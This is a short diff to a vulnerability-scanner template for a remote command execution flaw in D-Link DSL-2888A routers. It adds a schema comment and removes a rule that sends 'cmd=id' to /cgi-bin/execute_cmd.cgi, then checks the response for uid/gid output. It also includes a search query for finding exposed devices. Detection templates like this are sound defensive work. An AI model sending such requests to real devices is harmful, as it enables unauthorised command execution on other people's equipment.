@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: dlink-dsl-28881a-rce
 
 info:
@@ -9,11 +10,3 @@ info:
     fofa-query: body="DSL-2888A"
   reference:
     - https://mp.weixin.qq.com/s/_BX38i-IqrpsvNx4_LyH5g
-
-rules:
-  r0:
-    request:
-      method: GET
-      path: /cgi-bin/execute_cmd.cgi?timestamp=test&cmd=id
-    expression: response.status == 200 && "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)".bmatches(response.body)
-expression: r0()
